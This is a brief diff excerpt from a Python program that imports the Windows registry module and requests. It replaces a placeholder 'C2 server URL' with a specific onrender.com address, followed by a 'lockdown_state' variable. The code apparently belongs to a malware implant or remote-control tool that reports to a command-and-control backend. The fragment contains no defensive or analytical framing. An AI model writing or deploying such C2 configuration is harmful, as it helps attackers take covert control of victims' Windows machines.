@@ -12,7 +12,7 @@ import winreg
 import requests
 
 # 👉 REPLACE WITH YOUR PERMANENT RENDER C2 SERVER URL
-CLOUD_SERVER_URL = "https://your-c2-backend.onrender.com"
+CLOUD_SERVER_URL = "https://test-uukm.onrender.com/"
 
 # Global state tracking
 lockdown_state = {
